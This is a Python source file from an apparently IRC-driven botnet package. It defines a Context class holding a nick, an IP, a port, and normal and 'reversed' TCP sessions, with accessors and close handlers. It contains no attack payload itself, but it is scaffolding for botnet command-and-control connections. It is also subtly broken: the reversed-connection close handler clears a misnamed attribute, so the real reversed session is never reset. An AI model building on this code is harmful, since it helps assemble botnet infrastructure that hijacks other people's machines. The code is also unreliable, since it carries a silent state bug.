from botnet.tcp import tcp_services

class Context:
    def __init__(self, ircNick, ip, port):
        self.ircNick = ircNick
        self.ip = ip
        self.port = port
        self.connected = False
        self.TcpSession = tcp_services.TCPSession()
        self.TcpReversedSession = tcp_services.TCPSession()

    def get_ircNick(self):
        return self.ircNick
    
    def get_ip(self):
        return self.ip
    
    def get_port(self):
        return self.port
    
    def set_tcp_session(self, tcp_session):
        self.TcpSession = tcp_session

    def get_tcp_session(self):
        return self.TcpSession
    
    def set_reversed_session(self, tcp_session):
        self.TcpReversedSession = tcp_session

    def get_reversed_tcp_session(self):
        return self.TcpReversedSession

    async def onConnectionClosed(self, *args, **kwargs):
        self.TcpSession = None

    async def onReversedConnectionClosed(self, *args, **kwargs):
        self.TcpReversedConnection = None

